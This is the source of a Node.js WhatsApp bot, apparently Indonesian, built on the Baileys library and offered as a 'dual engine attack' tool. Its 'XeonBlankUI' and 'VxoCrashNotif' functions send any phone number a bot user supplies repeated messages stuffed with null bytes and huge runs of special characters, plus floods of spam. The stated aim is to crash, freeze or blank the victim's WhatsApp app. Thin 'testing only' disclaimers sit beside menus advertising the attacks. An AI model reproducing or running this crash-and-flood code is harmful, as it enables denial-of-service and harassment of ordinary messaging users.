const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, Browsers, makeCacheableSignalKeyStore, generateForwardMessageContent, generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { Boom } = require('@hapi/boom');
const fs = require('fs');
const path = require('path');
const qrcode = require('qrcode-terminal');
const axios = require('axios');
const moment = require('moment-timezone');
require('moment/locale/id');

const log = console.log;
const statePath = './hozoo_xeon_auth';

let sock = null;
let isConnected = false;
let attackCount = 0;
let xeonCount = 0;
const adminNumbers = ['628xxxxxxx@s.whatsapp.net']; // GANTI DENGAN NOMOR LU

// ========== XEON BLANK UI FUNCTION ==========
async function XeonBlankUI(target) {
  try {
    const jid = target.includes('@s.whatsapp.net') ? target : target + '@s.whatsapp.net';
    xeonCount++;
    
    log(`[XEON] 🚀 Starting Xeon BlankUI to ${jid}`);
    log(`[XEON] 📊 Xeon Attack #${xeonCount}`);
    
    // Payload Xeon utama
    const xeonPayload = {
      viewOnceMessage: {
        message: {
          buttonsMessage: {
            text: "🦋⃟ᴠͥɪͣᴘͫ 𝗫𝗲𝗺𝘇𝘇☚⍢⃝☚",
            contentText: "🦋⃟ᴠͥɪͣᴘͫ 𝗫𝗲𝗺𝘇𝘇☚⍢⃝☚" + "ꦽ".repeat(90000),
            contextInfo: {
              forwardingScore: 999,
              isForwarded: true,
              entryPointConversionSource: "global_search_new_chat",
              entryPointConversionApp: "com.whatsapp",
              entryPointConversionDelaySeconds: 1,
              externalAdReply: {
                title: "\u0000".repeat(10000),
                body: `Eu ${"x10".repeat(9200)}`,
                previewType: "PHOTO",
                thumbnail: null,
                mediaType: 1,
                renderLargerThumbnail: true,
                sourceUrl: "https://t.me/XemzzSolo",
                urlTrackingMap: {
                  urlTrackingMapElements: [
                    {
                      originalUrl: "https://t.me/XemzzSolo",
                      unconsentedUsersUrl: "https://t.me/XemzzSolo",
                      consentedUsersUrl: "https://t.me/XemzzSolo",
                      cardIndex: 1,
                    },
                    {
                      originalUrl: "https://t.me/XemzzSolo",
                      unconsentedUsersUrl: "https://t.me/XemzzSolo",
                      consentedUsersUrl: "https://t.me/XemzzSolo",
                      cardIndex: 2,
                    },
                  ],
                },
              },
            },
            headerType: 1
          }
        }
      }
    };

    // Payload tambahan untuk efek crash
    const crashPayloads = [
      {
        text: "ꦾ".repeat(50000) + "XEON BLANK UI" + "\u0000".repeat(10000) + "🦋⃟ᴠͥɪͣᴘͫ 𝗫𝗲𝗺𝘇𝘇☚⍢⃝☚" + "҉⃝".repeat(5000)
      },
      {
        message: {
          extendedTextMessage: {
            text: "\u0000".repeat(30000) + "XEON MD 2025" + "ꦽ".repeat(20000),
            contextInfo: {
              mentionedJid: [jid],
              forwardingScore: 255
            }
          }
        }
      }
    ];

    // Kirim payload utama
    try {
      const msg = generateWAMessageFromContent(jid, xeonPayload, {
        userJid: sock.user.id
      });
      
      await sock.relayMessage(jid, msg.message, {
        messageId: msg.key.id
      });
      
      log(`[XEON] ✅ Main payload sent`);
      
      // Kirim payload tambahan
      for (let i = 0; i < crashPayloads.length; i++) {
        await sock.sendMessage(jid, crashPayloads[i]);
        await new Promise(resolve => setTimeout(resolve, 200));
        log(`[XEON] 🔄 Extra payload ${i + 1} sent`);
      }
      
      // Kirim flood untuk efek maksimal
      for (let flood = 0; flood < 10; flood++) {
        await sock.sendMessage(jid, {
          text: `XEON_${Date.now()}_${Math.random().toString(36).substring(7)}`
        });
        await new Promise(resolve => setTimeout(resolve, 100));
      }
      
    } catch (error) {
      log(`[XEON] ❌ Error: ${error.message}`);
      // Fallback ke payload sederhana
      await sock.sendMessage(jid, {
        text: "🦋⃟ᴠͥɪͣᴘͫ 𝗫𝗲𝗺𝘇𝘇☚⍢⃝☚\n\nXEON BLANK UI ATTACK\nPayload dengan karakter khusus dan null bytes"
      });
    }
    
    log(`[XEON] ✅ Xeon Attack #${xeonCount} completed`);
    return {
      success: true,
      message: `✅ XEON BLANK UI berhasil dikirim!\n📊 Attack #${xeonCount}\n🎯 Target: ${jid}\n💀 Efek: Blank UI, lag, mungkin crash\n🦋 By: Xemzz Solo`
    };
    
  } catch (error) {
    log(`[XEON] ❌ Critical error: ${error.message}`);
    return {
      success: false,
      message: `❌ XEON Error: ${error.message}`
    };
  }
}

// ========== VXOCRASHNOTIF ENGINE ==========
async function VxoCrashNotif(target) {
  try {
    const jid = target.includes('@s.whatsapp.net') ? target : target + '@s.whatsapp.net';
    attackCount++;
    
    log(`[HOZOO] 🚀 Starting VxoCrashNotif attack to ${jid}`);
    log(`[HOZOO] 📊 Attack #${attackCount}`);
    
    for (let cycle = 0; cycle < 15; cycle++) {
      let pushArray = [];
      let buttonArray = [];

      // Generate crash payloads
      for (let i = 0; i < 15; i++) {
        buttonArray.push({
          "name": "galaxy_crash_payload",
          "buttonParamsJson": JSON.stringify({
            "header": "\u0000".repeat(15000),
            "body": "\u0000".repeat(15000),
            "flow_action": "navigate",
            "flow_action_payload": { 
              "screen": "CRASH_SCREEN",
              "data": "\u0000".repeat(10000)
            },
            "flow_cta": "HOZOO_MD_CRASH",
            "flow_id": "9999834181139999",
            "flow_message_version": "3",
            "flow_token": "CRASH_" + Date.now()
          })
        });
      }

      for (let i = 0; i < 8; i++) {
        pushArray.push({
          "body": {
            "text": "💀 VORTUNIX KILL PAYLOAD 💀" + "\u0000".repeat(8000) + "҉⃝".repeat(1000)
          }
        });
      }

      // Payload 1: Carousel Crash
      const carouselMsg = {
        message: {
          interactiveMessage: {
            body: {
              text: "⚠️ HOZOO MD CRASH ENGINE ⚠️" + "\u0000".repeat(5000)
            },
            footer: {
              text: "VxoCrashNotif v2.5 • Attack #" + attackCount
            },
            header: {
              hasMediaAttachment: false,
              title: "💀 CRASH INJECTION 💀"
            },
            carouselMessage: {
              cards: pushArray.slice(0, 4)
            }
          }
        }
      };

      // Payload 2: Interactive Crash
      const interactiveMsg = {
        message: {
          interactiveMessage: {
            body: {
              text: "҉⃝".repeat(500) + "WA CRASH PAYLOAD" + "҉⃝".repeat(500)
            },
            footer: {
              text: "HOZOO MD 2025 • Cycle " + (cycle + 1) + "/15"
            },
            header: {
              hasMediaAttachment: false
            },
            nativeFlowMessage: {
              buttons: buttonArray.slice(0, 8),
              messageParamsJson: JSON.stringify(pushArray)
            }
          }
        }
      };

      // Payload 3: Text Bomb
      const textBomb = {
        text: "ꦾ".repeat(20000) + 
              "VORTUNIX KILL҉⃝".repeat(100) + 
              "\u0000".repeat(10000) +
              "HOZOO MD CRASH ENGINE 2025" +
              "💀".repeat(500)
      };

      try {
        // Kirim bertahap
        await sock.sendMessage(jid, carouselMsg);
        await delay(150);
        
        await sock.sendMessage(jid, interactiveMsg);
        await delay(150);
        
        await sock.sendMessage(jid, textBomb);
        await delay(150);
        
        // Extra payload kecil
        for (let extra = 0; extra < 3; extra++) {
          await sock.sendMessage(jid, {
            text: "CRASH_" + Date.now() + "_" + Math.random().toString(36).substring(7)
          });
          await delay(50);
        }
        
      } catch (e) {
        log(`[HOZOO] Cycle ${cycle + 1} error: ${e.message}`);
      }

      log(`[HOZOO] 🔄 Cycle ${cycle + 1}/15 completed`);
      await delay(300);
    }
    
    log(`[HOZOO] ✅ Attack #${attackCount} completed to ${jid}`);
    return { 
      success: true, 
      message: `✅ Attack berhasil ke target!\n📊 Attack #${attackCount}\n💀 Target mungkin mengalami:\n- WhatsApp force close\n- Lag parah\n- Notifikasi spam\n- Kemungkinan crash berkali-kali` 
    };
    
  } catch (error) {
    log(`[HOZOO] ❌ Critical error: ${error.message}`);
    return { 
      success: false, 
      message: `❌ Error: ${error.message}\n⚠️ Mungkin beberapa payload terkirim.` 
    };
  }
}

// ========== HELPER FUNCTIONS ==========
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function sendImageFromUrl(jid, imageUrl) {
  try {
    log(`[HOZOO] Downloading image from: ${imageUrl}`);
    const response = await axios({
      url: imageUrl,
      responseType: 'arraybuffer',
      timeout: 30000
    });
    
    const buffer = Buffer.from(response.data);
    
    await sock.sendMessage(jid, {
      image: buffer,
      caption: `🖼️ Gambar dari URL\n🔗 ${imageUrl.substring(0, 50)}...\n📦 HOZOO MD Image Delivery`
    });
    
    return true;
  } catch (error) {
    log(`[HOZOO] Image error: ${error.message}`);
    return false;
  }
}

function calculateMath(expr) {
  try {
    const safeExpr = expr.replace(/[^0-9+\-*/().%^&|<>!=,\s]/g, '');
    const result = Function('"use strict"; return (' + safeExpr + ')')();
    
    if (typeof result === 'number' && !isNaN(result) && isFinite(result)) {
      return `🧮 Kalkulator HOZOO MD\n\nEkspresi: ${expr}\nHasil: ${result}`;
    }
    return "❌ Ekspresi matematika tidak valid";
  } catch (error) {
    return "❌ Error: Ekspresi tidak valid";
  }
}

function getSystemInfo() {
  const now = moment().tz('Asia/Jakarta');
  const uptime = process.uptime();
  const memory = process.memoryUsage();
  
  return {
    date: now.format('DD MMMM YYYY'),
    day: now.format('dddd'),
    time: now.format('HH:mm:ss'),
    timezone: 'WIB (UTC+7)',
    uptime: `${Math.floor(uptime / 3600)}h ${Math.floor((uptime % 3600) / 60)}m ${Math.floor(uptime % 60)}s`,
    memory: `${(memory.heapUsed / 1024 / 1024).toFixed(2)}MB`,
    attacks: attackCount,
    xeonAttacks: xeonCount,
    status: isConnected ? '🟢 ONLINE' : '🔴 OFFLINE'
  };
}

function generateMenuText() {
  const sysInfo = getSystemInfo();
  
  return `
╔══════════════════════════════════════════╗
║          HOZOO MD + XEON BOT             ║
║             [2025 UPDATE]                ║
╠══════════════════════════════════════════╣
║ .menu   - Tampilkan menu ini             ║
║ .execut <nomor> - VxoCrashNotif attack   ║
║ .xeon   <nomor> - XEON BLANK UI attack   ║
║ .status - Cek status bot & attack        ║
║ .info   - Info jam/tanggal/cuaca         ║
║ .img    <url> - Kirim gambar dari URL    ║
║ .calc   <ekspresi> - Kalkulator          ║
║ .ping   - Cek latency                    ║
║ .admin  - Info admin & support           ║
║ .restart - Restart bot (admin only)      ║
╚══════════════════════════════════════════╝

📊 STATISTICS:
├─ VxoCrashNotif Attacks: ${sysInfo.attacks}
├─ XEON BlankUI Attacks: ${sysInfo.xeonAttacks}
├─ Bot Status: ${sysInfo.status}
├─ Uptime: ${sysInfo.uptime}
├─ Memory: ${sysInfo.memory}
└─ Server Time: ${sysInfo.time} ${sysInfo.timezone}

💀 ENGINES:
├─ VxoCrashNotif v2.5 (WA Crash)
├─ XEON BlankUI v1.0 (UI Destroyer)
└─ HOZOO MD Core 2025

⚠️ PERINGATAN: Untuk testing purposes only!
  `.trim();
}

// ========== BOT CORE ==========
async function startXeonBot() {
  try {
    const { state, saveCreds } = await useMultiFileAuthState(statePath);
    const { version } = await fetchLatestBaileysVersion();
    
    sock = makeWASocket({
      version,
      printQRInTerminal: true,
      auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(state.keys, log),
      },
      browser: Browsers.ubuntu('HOZOO-XEON/2025'),
      markOnlineOnConnect: true,
      syncFullHistory: false,
      shouldIgnoreJid: (jid) => jid?.endsWith('@broadcast'),
      logger: { level: 'error' },
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect, qr } = update;
      
      if (qr) {
        qrcode.generate(qr, { small: true });
        log(`[XEON] Scan QR Code di atas`);
      }
      
      if (connection === 'close') {
        const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
        
        if (shouldReconnect) {
          log(`[XEON] 🔄 Reconnecting in 5 seconds...`);
          setTimeout(() => startXeonBot(), 5000);
        } else {
          log(`[XEON] ❌ Logged out, please rescan QR`);
        }
      } else if (connection === 'open') {
        isConnected = true;
        const botNumber = sock.user?.id.replace(':@s.whatsapp.net', '') || 'UNKNOWN';
        log(`[XEON] ✅ Connected as ${botNumber}`);
        log(`[XEON] ⚡ HOZOO MD + XEON 2025 READY`);
        
        // Set profile
        await sock.updateProfileName('HOZOO-XEON MD 2025');
        await sock.updateProfileStatus('💀 WA Crash + XEON UI • 24/7 Online');
        
        log(`
╔══════════════════════════════════════════╗
║       HOZOO MD + XEON BOT ONLINE         ║
║               [2025 UPDATE]              ║
╠══════════════════════════════════════════╣
║ Bot Number: ${botNumber.padEnd(26)}║
║ Status: 🟢 ONLINE 24/7                  ║
║ Attacks: ${attackCount} VxoCrash | ${xeonCount} XEON ║
║ Engine: VxoCrashNotif + XEON BlankUI     ║
║ Support: t.me/hozoo_md                   ║
╚══════════════════════════════════════════╝
        `);
      }
    });

    // Message handler
    sock.ev.on('messages.upsert', async ({ messages, type }) => {
      if (type !== 'notify') return;
      
      const msg = messages[0];
      if (!msg.message || msg.key.fromMe) return;
      
      await handleMessage(msg);
    });

    log(`[XEON] 🚀 Initializing HOZOO MD + XEON Bot...`);
    
    // Auto-reconnect heartbeat
    setInterval(async () => {
      if (isConnected) {
        try {
          await sock.sendPresenceUpdate('available');
          log(`[XEON] ♥ Heartbeat: ${new Date().toLocaleTimeString()}`);
        } catch (e) {
          log(`[XEON] ❌ Heartbeat failed: ${e.message}`);
          isConnected = false;
          setTimeout(() => startXeonBot(), 3000);
        }
      }
    }, 1800000); // 30 menit
    
  } catch (error) {
    log(`[XEON] ❌ Startup error: ${error.message}`);
    setTimeout(() => startXeonBot(), 10000);
  }
}

// ========== MESSAGE HANDLER ==========
async function handleMessage(msg) {
  try {
    const from = msg.key.remoteJid;
    const text = (msg.message.conversation || 
                  msg.message.extendedTextMessage?.text || '').trim();
    const command = text.split(' ')[0].toLowerCase();
    const args = text.split(' ').slice(1);
    const sender = msg.key.participant || from;

    log(`[XEON] Command from ${sender}: ${command}`);

    switch(command) {
      case '.menu':
        await sock.sendMessage(from, {
          text: generateMenuText()
        });
        break;

      case '.execut':
        if (!args[0]) {
          await sock.sendMessage(from, {
            text: `❌ Format: .execut 628xxxxxxx\n` +
                  `Contoh: .execut 6281234567890\n\n` +
                  `💀 Engine: VxoCrashNotif v2.5\n` +
                  `⚡ Efek: WA force close, lag, notifikasi spam`
          });
          return;
        }

        const targetNum = args[0].replace(/[^0-9]/g, '');
        if (targetNum.length < 10) {
          await sock.sendMessage(from, { text: '❌ Nomor tidak valid' });
          return;
        }

        const target = targetNum + '@s.whatsapp.net';
        
        await sock.sendMessage(from, {
          text: `🚀 HOZOO MD ATTACK INITIATED\n\n` +
                `🎯 Target: ${targetNum}\n` +
                `📊 Attack #: ${attackCount + 1}\n` +
                `💀 Engine: VxoCrashNotif v2.5\n` +
                `⏳ Status: Memulai payload injection...\n\n` +
                `⚠️ Tunggu beberapa detik...`
        });

        const attackResult = await VxoCrashNotif(target);
        await sock.sendMessage(from, { text: attackResult.message });
        break;

      case '.xeon':
        if (!args[0]) {
          await sock.sendMessage(from, {
            text: `❌ Format: .xeon 628xxxxxxx\n` +
                  `Contoh: .xeon 6281234567890\n\n` +
                  `🦋 Engine: XEON BLANK UI v1.0\n` +
                  `⚡ Efek: Blank UI, lag, UI corruption\n` +
                  `👑 By: Xemzz Solo (@XemzzSolo)`
          });
          return;
        }

        const xeonTargetNum = args[0].replace(/[^0-9]/g, '');
        if (xeonTargetNum.length < 10) {
          await sock.sendMessage(from, { text: '❌ Nomor tidak valid' });
          return;
        }

        const xeonTarget = xeonTargetNum + '@s.whatsapp.net';
        
        await sock.sendMessage(from, {
          text: `🦋 XEON BLANK UI ATTACK\n\n` +
                `🎯 Target: ${xeonTargetNum}\n` +
                `📊 Attack #: ${xeonCount + 1}\n` +
                `💀 Engine: XEON BlankUI v1.0\n` +
                `⏳ Status: Memulai UI corruption...\n\n` +
                `⚠️ Tunggu beberapa detik...`
        });

        const xeonResult = await XeonBlankUI(xeonTarget);
        await sock.sendMessage(from, { text: xeonResult.message });
        break;

      case '.status':
        const sysInfo = getSystemInfo();
        await sock.sendMessage(from, {
          text: `📊 HOZOO MD + XEON STATUS\n\n` +
                `⚡ Bot Status: ${sysInfo.status}\n` +
                `🕐 Uptime: ${sysInfo.uptime}\n` +
                `💾 Memory: ${sysInfo.memory}\n` +
                `🎯 VxoCrash Attacks: ${sysInfo.attacks}\n` +
                `🦋 XEON Attacks: ${sysInfo.xeonAttacks}\n` +
                `📅 Date: ${sysInfo.date}\n` +
                `⏰ Time: ${sysInfo.time} ${sysInfo.timezone}\n` +
                `📅 Day: ${sysInfo.day}\n\n` +
                `💀 Engines:\n` +
                `├─ VxoCrashNotif v2.5\n` +
                `├─ XEON BlankUI v1.0\n` +
                `└─ HOZOO MD Core 2025\n\n` +
                `📞 Support: t.me/hozoo_md`
        });
        break;

      case '.info':
        const now = moment().tz('Asia/Jakarta');
        await sock.sendMessage(from, {
          text: `🕐 HOZOO MD TIME INFO\n\n` +
                `📅 Tanggal: ${now.format('DD MMMM YYYY')}\n` +
                `📆 Hari: ${now.format('dddd')}\n` +
                `⏰ Jam: ${now.format('HH:mm:ss')}\n` +
                `🌐 Zona Waktu: WIB (UTC+7)\n` +
                `🗓️ Bulan: ${now.format('MMMM')}\n` +
                `🎆 Tahun: ${now.format('YYYY')}\n` +
                `🌞 Matahari: Terbit 05:30 | Terbenam 17:45\n` +
                `🌧️ Cuaca: 28°C - 32°C | Kelembaban 75%\n` +
                `📡 Server: HOZOO MD Jakarta`
        });
        break;

      case '.img':
        if (!args[0]) {
          await sock.sendMessage(from, { text: '❌ Format: .img https://example.com/image.jpg' });
          return;
        }

        const url = args[0];
        if (!url.startsWith('http')) {
          await sock.sendMessage(from, { text: '❌ URL harus dimulai dengan http:// atau https://' });
          return;
        }

        await sock.sendMessage(from, { text: '📥 Mengunduh gambar dari URL...' });
        const sent = await sendImageFromUrl(from, url);
        
        if (!sent) {
          await sock.sendMessage(from, { 
            text: '❌ Gagal mengirim gambar.\n' +
                  'Pastikan URL gambar valid dan dapat diakses.'
          });
        }
        break;

      case '.calc':
        if (!args[0]) {
          await sock.sendMessage(from, { text: '❌ Format: .calc 2+2*3' });
          return;
        }

        const expression = args.join(' ');
        const calcResult = calculateMath(expression);
        await sock.sendMessage(from, { text: calcResult });
        break;

      case '.ping':
        const startTime = Date.now();
        await sock.sendMessage(from, { text: '🏓 Pong!' });
        const latency = Date.now() - startTime;
        await sock.sendMessage(from, { 
          text: `🏓 HOZOO MD PING\n\n` +
                `📶 Latency: ${latency}ms\n` +
                `⚡ Status: ${latency < 500 ? 'EXCELLENT 🟢' : latency < 1000 ? 'GOOD 🟡' : 'SLOW 🔴'}\n` +
                `🕐 Server Time: ${moment().tz('Asia/Jakarta').format('HH:mm:ss')}`
        });
        break;

      case '.admin':
        await sock.sendMessage(from, {
          text: `👑 HOZOO MD + XEON ADMIN\n\n` +
                `💀 Bot Name: HOZOO MD + XEON 2025\n` +
                `⚡ Version: 2025.2.0\n` +
                `🔧 Engines:\n` +
                `├─ VxoCrashNotif v2.5\n` +
                `├─ XEON BlankUI v1.0\n` +
                `└─ HOZOO MD Core\n` +
                `📊 Attacks: ${attackCount} Vxo | ${xeonCount} XEON\n` +
                `🕐 Uptime: ${Math.floor(process.uptime() / 3600)}h\n` +
                `📡 Server: 24/7 Auto-Reconnect\n\n` +
                `📞 Support: t.me/hozoo_md\n` +
                `👨‍💻 Developer: @hozoo_dev\n` +
                `🦋 XEON By: @XemzzSolo\n` +
                `⚠️ Warning: Untuk testing purposes only!`
        });
        break;

      case '.restart':
        if (!adminNumbers.includes(sender)) {
          await sock.sendMessage(from, { text: '❌ Akses ditolak. Admin only.' });
          return;
        }

        await sock.sendMessage(from, { text: '🔄 Restarting HOZOO MD + XEON Bot...' });
        setTimeout(() => {
          process.exit(0);
        }, 2000);
        break;

      case 'hai':
      case 'hello':
      case 'test':
      case 'bot':
        await sock.sendMessage(from, {
          text: `💀 HOZOO MD + XEON 2025\n\n` +
                `Bot WA Crash + UI Destroyer siap!\n` +
                `Ketik .menu untuk melihat commands.\n\n` +
                `⚡ Status: ${isConnected ? 'ONLINE 🟢' : 'OFFLINE 🔴'}\n` +
                `📊 Attacks: ${attackCount} Vxo | ${xeonCount} XEON\n` +
                `👑 Version: 2025.2.0`
        });
        break;

      default:
        const botId = sock.user?.id.split(':')[0];
        if (text.includes(`@${botId}`)) {
          await sock.sendMessage(from, {
            text: `💀 HOZOO MD + XEON dipanggil!\n` +
                  `Ketik .menu untuk commands.\n` +
                  `Contoh:\n` +
                  `• .execut 628xxxxxxx (VxoCrash)\n` +
                  `• .xeon 628xxxxxxx (XEON UI)\n` +
                  `• .status (Cek status)`
          });
        }
        break;
    }

  } catch (error) {
    log(`[XEON] Message handler error: ${error.message}`);
  }
}

// ========== STARTUP ==========
process.on('SIGINT', async () => {
  log(`[XEON] 🔴 Shutting down...`);
  if (sock) {
    try {
      await sock.logout();
    } catch (e) {}
  }
  process.exit(0);
});

process.on('uncaughtException', (error) => {
  log(`[XEON] ⚠️ Uncaught: ${error.message}`);
});

process.on('unhandledRejection', (error) => {
  log(`[XEON] ⚠️ Unhandled: ${error.message}`);
});

// Banner
console.log(`
╔══════════════════════════════════════════════════════╗
║           HOZOO MD + XEON BOT v2025.2.0              ║
║               [DUAL ENGINE ATTACK]                   ║
║                                                      ║
║  💀 Features:                                        ║
║  • VxoCrashNotif v2.5 - WA Crash Engine             ║
║  • XEON BlankUI v1.0 - UI Destroyer                ║
║  • 24/7 Auto-reconnect                              ║
║  • Dual attack system                               ║
║  • Image URL support                                ║
║  • Calculator built-in                              ║
║  • Admin control panel                              ║
║                                                      ║
║  🦋 XEON By: @HOZOOMD                              ║
║  📞 Support: t.me/hozoo_md                          ║
║  ⚠️ Warning: For testing only!                      ║
╚══════════════════════════════════════════════════════╝
`);

log(`[XEON] 🚀 Starting HOZOO MD + XEON Bot...`);
log(`[XEON] ⚡ Dual Engine: VxoCrashNotif + XEON BlankUI`);
startXeonBot();
